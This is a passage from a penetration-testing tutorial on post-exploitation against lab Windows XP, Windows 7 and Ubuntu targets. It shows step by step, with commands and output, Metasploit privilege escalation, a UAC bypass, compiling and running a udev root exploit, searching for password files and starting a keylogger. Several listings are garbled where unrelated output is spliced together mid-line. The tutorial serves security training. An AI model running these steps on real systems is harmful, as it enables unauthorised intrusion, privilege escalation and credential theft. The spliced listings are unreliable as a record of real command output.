### Writing 290 bytes at address 0x00f70000
- **Action**: Writing 290 bytes at address 0x00f70000.
- **Action**: Sending a 751,104-byte stage to 192.168.20.10.
- **Action**: Restoring the original token...
- **Result**: Meterpreter session 4 opened (192.168.20.9:4444 -> 192.168.20.10:1108) at 2015-08-14 01:59:46 -0400.

```plaintext
meterpreter >
```

**Listing 13-8: Metasploit Local Exploit**

After entering `exploit`, Metasploit executes the exploit in the Windows XP session. If successful, you will receive another Meterpreter session. Running `getuid` on this new session should confirm that you have obtained System privileges.

**Note**: Local privilege-escalation attacks rely on flaws such as missing patches or security misconfigurations. A fully updated and locked-down system would not be vulnerable to the MS11-08 exploit, as a vendor patch was released in 2011.

### Bypassing UAC on Windows

Now, let's escalate our privileges on a more secure Windows 7 target, which includes user account control (UAC). Applications running on Windows Vista and higher are limited to regular user privileges. If an application needs administrative privileges, an administrative user must approve the elevation.

Since we gained this session by having the user Georgia Weidman run a malicious binary, the Meterpreter session currently has her privileges. Attempt to use `getsystem` against this target, as shown in Listing 13-9.

```plaintext
msf exploit(ms11_080_afdjoinleaf) > sessions -i 2
[*] Starting interaction with 2...
meterpreter > getuid
Server username: Book-Win7\Georgia Weidman
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: Access is denied.
```

**Listing 13-9: `getsystem` Fails on Windows 7**

As seen, running `getsystem` fails and returns an error message. This could be due to the system being fully patched and hardened. However, it turns out that the Windows 7 target has not been patched since installation, and UAC is preventing `getsystem` from working properly.

Researchers have developed multiple techniques to bypass UAC. One such technique is included in Metasploit in the local exploit `windows/local/bypassuac`. Background the session and run this exploit on your Windows 7 session, as shown in Listing 13-10.

```plaintext
msf exploit(ms11_080_afdjoinleaf) > use exploit/windows/local/bypassuac
msf exploit(bypassuac) > show options
Module options (exploit/windows/local/bypassuac):
Name Current Setting Required Description
---- --------------- -------- -----------
SESSION yes The session to run this module
msf exploit(bypassuac) > set SESSION 2
SESSION => 2
msf exploit(bypassuac) > exploit
[*] Started reverse handler on 192.168.20.9:4444
[*] UAC is Enabled, checking level...
--snip--
[*] Uploaded the agent to the filesystem....
[*] Sending stage (751104 bytes) to 192.168.20.12
[*] Meterpreter session 5 opened (192.168.20.9:4444 -> 192.168.20.12:49265) at 2015-08-14 02:17:05 -0400
[-] Exploit failed: Rex::TimeoutError Operation timed out.
meterpreter > getuid
Server username: Book-Win7\Georgia Weidman
```

**Listing 13-10: Using a Module to Bypass UAC Control**

The module uses a trusted publisher certificate through process injection to bypass UAC controls. As shown by the `getuid` command, although the new session is still running as Georgia Weidman, UAC is no longer a restriction. If successful, a new Meterpreter session will open.

With UAC out of the way, `getsystem` can now gain system privileges without issues.

```plaintext
meterpreter > getsystem
...got system (via technique 1).
```

### Udev Privilege Escalation on Linux

We have yet to try privilege escalation on our Linux target. Let's use public exploit code instead of Metasploit to perform a local privilege-escalation attack on Linux.

We can interact with our Linux target via SSH or by using the TikiWiki to gain a Meterpreter shell. The Linux Meterpreter has fewer commands than its Windows counterpart, but both allow us to drop into a regular command shell, as shown in Listing 13-11.

```plaintext
meterpreter > shell
Process 13857 created.
Channel 0 created.
whoami
www-data
```

**Listing 13-11: Dropping to a Shell in Meterpreter**

Our TikiWiki exploit gained a session as the user `www-data`, a limited web server account. We also have a Bash shell as the user `georgia` through SSH, which has more privileges but is still not root.

#### Finding a Vulnerability

To find a local privilege-escalation vulnerability, we need information about the local system, such as the kernel and Ubuntu versions. Use the `uname -a` and `lsb_release -a` commands, as shown in Listing 13-12.

```plaintext
uname -a
Linux ubuntu 2.6.27-7-generic #1 SMP Fri Oct 24 06:42:44 UTC 2008 i686 GNU/Linux
lsb_release -a
Distributor ID: Ubuntu
Description: Ubuntu 8.10
Release: 8.10
Codename: intrepid
```

**Listing 13-12: Gathering Local Information**

The Linux target is running kernel 2.6.27-2 and Ubuntu 8.10 (Intrepid), which is outdated and vulnerable to multiple known privilege-escalation issues. We'll focus on a vulnerability in `udev`, the device manager for the Linux kernel.

Vulnerability CVE-2009-1185 describes an issue where the `udev` daemon, running with root privileges, fails to check if driver load requests originate from the kernel. User-space processes can send messages to `udev` and execute code with root privileges.

According to SecurityFocus.com, Ubuntu 8.10 is affected, and `udev` versions 141 and earlier are vulnerable. Check the `udev` version with the `udevadm --version` command, as shown here.

```plaintext
georgia@ubuntu:~$ udevadm --version
124
```

The `udev` version 124 is earlier than 141, confirming the vulnerability.

#### Finding an Exploit

Kali Linux includes a local repository of public exploit code from Exploitdb.com at `/usr/share/exploitdb`, which includes a utility called `searchsploit` for finding useful code. For example, Listing 13-13 shows the results of a search for `udev` exploits.

```plaintext
root@kali:~# /usr/share/exploitdb/searchsploit udev
Description Path
---------------------------------------------------------------------- ----------------------
Linux Kernel 2.6 UDEV Local Privilege Escalation Exploit /linux/local/8478.sh
Linux Kernel 2.6 UDEV ] 2,768 --.-K/s in 0s
2015-08-14 14:30:52 (271 MB/s) - `8572.c' saved [2768/2768]
```

**Listing 13-15: Using `wget` to Download a File**

Compile the exploit code with GCC on the Linux target, specifying an output file name with the `-o` flag.

```plaintext
georgia@ubuntu:~$ gcc -o exploit 8572.c
```

Find the `udev` netlink socket PID mentioned in the exploitâ€™s usage information (Listing 13-14) for the argument. The usage information notes that the PID is listed in `/proc/net/netlink`.

```plaintext
georgia@ubuntu:~$ cat /proc/net/netlink
sk Eth Pid Groups Rmem Wmem Dump Locks
f7a90e00 0 5574 00000111 0 0 00000000 2
da714400 0 6476 00000001 0 0 00000000 2
da714c00 0 4200780 00000000 0 0 00000000 2
--snip--
f7842e00 15 2468 00000001 0 0 00000000 2
f75d5c00 16 0 00000000 0 0 00000000 2
f780f600 18 0 00000000 0 0 00000000 2
```

**Listing 13-16: The `/proc/net/netlink` File**

The required PID is usually the `udev` daemon's PID minus 1. Use the `ps aux` command to find the `udev` process, as shown here.

```plaintext
georgia@ubuntu:~$ ps aux | grep udev
root 2469 0.0 0.0 2452 980 ? S search -f *password*
Found 8 results...
c:\\WINDOWS\Help\password.chm (21891 bytes)
c:\\xampp\passwords.txt (362 bytes)
c:\\xampp\php\PEAR\Zend\Dojo\Form\Element\PasswordTextBox.php (1446 bytes)
c:\\xampp\php\PEAR\Zend\Dojo\View\Helper\PasswordTextBox.php (1869 bytes)
c:\\xampp\php\PEAR\Zend\Form\Element\Password.php (2383 bytes)
c:\\xampp\php\PEAR\Zend\View\Helper\FormPassword.php (2942 bytes)
c:\\xampp\phpMyAdmin\user_password.php (4622 bytes)
c:\\xampp\phpMyAdmin\libraries\display_change_password.lib.php (3467 bytes)
```

**Listing 13-18: Using Meterpreter to Look for Files**

### Keylogging

Another method to gather information is to capture keystrokes. Meterpreter includes a keylogger for this purpose. Start the keylogger on the Windows XP Meterpreter session by entering `keyscan_start`, as shown here.

```plaintext
meterpreter > keyscan_start
Starting the keystroke sniffer...
```

**Note**: You will capture keystrokes only in the current context. In this example, I used the original Windows XP session where I am the user `georgia` in the `explorer.exe` process, capturing `georgia`'s keystrokes. Another idea is to migrate into the `winlogon` process to see only login information typed.